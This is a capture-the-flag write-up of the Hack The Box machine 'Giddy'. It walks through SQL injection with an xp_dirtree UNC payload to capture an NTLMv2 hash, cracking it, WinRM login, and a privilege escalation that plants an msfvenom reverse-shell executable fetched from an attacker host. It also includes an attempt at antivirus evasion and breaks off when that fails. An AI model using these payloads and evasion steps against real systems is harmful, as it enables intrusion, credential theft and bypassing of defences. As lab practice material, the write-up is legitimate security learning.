---
hidden: true
icon: windows
---

# Giddy - Medium

<figure><img src="../../.gitbook/assets/image (2837).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/giddy"><strong>Giddy</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.104 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-17 14:57 EST
Nmap scan report for 10.10.10.104
Host is up (0.034s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn: 
|   h2
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
|_ssl-date: 2025-11-17T20:00:15+00:00; 0s from scanner time.
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2025-11-16T19:44:57
|_Not valid after:  2026-05-18T19:44:57
| rdp-ntlm-info: 
|   Target_Name: GIDDY
|   NetBIOS_Domain_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy
|   DNS_Computer_Name: Giddy
|   Product_Version: 10.0.14393
|_  System_Time: 2025-11-17T20:00:10+00:00
|_ssl-date: 2025-11-17T20:00:15+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   51.85 ms 10.10.16.1
2   51.94 ms 10.10.10.104
```

### <mark style="color:$primary;">HTTP/S Port 80/443 TCP</mark>

Both port 80 and 443 show the same picture on the default page

<figure><img src="../../.gitbook/assets/image (2838).png" alt=""><figcaption></figcaption></figure>

#### Directory Busting

{% code overflow="wrap" %}
```powershell
gobuster dir -u http://10.10.10.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x asp,aspx -t 70
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2857).png" alt=""><figcaption></figcaption></figure>

2 interesting endpoints came out!

#### <mark style="color:$primary;">/remote endpoint</mark>

<figure><img src="../../.gitbook/assets/image (2858).png" alt=""><figcaption></figcaption></figure>

It's a login page for a Windows PowerShell Web Access for Windows 2016:

#### <mark style="color:$primary;">/mvc endpoint</mark>

<figure><img src="../../.gitbook/assets/image (2859).png" alt=""><figcaption></figcaption></figure>

Looks like an online store

### <mark style="color:$primary;">SQLI in path variable</mark>

While checking out the mvc endpoint I discovered that the path variable is vulnerable to SQLi just by simply placing a quotation mark at the end.

<figure><img src="../../.gitbook/assets/image (2830).png" alt=""><figcaption></figcaption></figure>

xp\_dirtree is enabled on the machine! We can use this and grab the NTLMv2 hash of the user running the service.

```sql
; EXECUTE master ..xp_dirtree '\\10.10.16.2\test'; --
```

This is the command we will use to grab the hash but before that make sure you have responder ready

```powershell
sudo responder -I tun0
```

I am going to capture the request in burpsuite and modify it there

<figure><img src="../../.gitbook/assets/image (2831).png" alt=""><figcaption></figcaption></figure>

After sending the request you should see a hash captured by responder&#x20;

<figure><img src="../../.gitbook/assets/image (2832).png" alt=""><figcaption></figcaption></figure>

Save it to a file and let's try cracking it

### <mark style="color:$primary;">Cracking NTLMv2 Hash</mark>

I'll use john to crack it&#x20;

```powershell
john stacy.hash -w=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (2833).png" alt=""><figcaption></figcaption></figure>

```
Stacy:xNnWo6272k7x
```

Now we have stacy's password&#x20;

We could login via the powershell console we discovered earlier at the /remote enpoint. But winrm is open on the machine let's login through there.

```powershell
evil-winrm -i 10.10.10.104 -u Stacy -p xNnWo6272k7x
```

<figure><img src="../../.gitbook/assets/image (2834).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2835).png" alt=""><figcaption></figcaption></figure>

There is an interesting file in the documents directory. A quick google search reveals a local privesc vulnerability on exploitDB

{% embed url="https://www.exploit-db.com/exploits/43390" %}

#### Why is it vulnerable

When the service <mark style="color:yellow;">**Ubiquiti UniFi Video**</mark> starts it tries to execute a file called `taskkill.exe` in `C:\ProgramData\unifi-video\` but that file doesn’t exist by default , if we have write permissions on that directory we can place a malicious payload there as `taskkill.exe` then restart the service. And because the service runs with privileged permissions , it will be executed as administrator.

I will create a malicious taskkill.exe using msfvenom

{% code overflow="wrap" %}
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=80 -f exe > taskkill.exe
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I am going to use a simple python webserver to transfer the payload

#### Transfering Payload

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
iwr -uri http://10.10.16.2/taskkill.exe -outfile taskkill.exe
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ok let's have a listener ready then stop and start the service again for our payload to execute

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ok I tried different payloads and still nothing there might be an Antivirus blocking our payload. I am going to use phantom evasion to generate our executable

{% embed url="https://github.com/oddcod3/Phantom-Evasion" %}

### <mark style="color:$primary;">Antivirus Evasion -> Privesc</mark>

```bash
python3 phantom-evasion.py
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now select **\[1] windows modules** , then **\[1] windows shellcode injection**&#x20;

Phantom evasion was finicky did not work for me
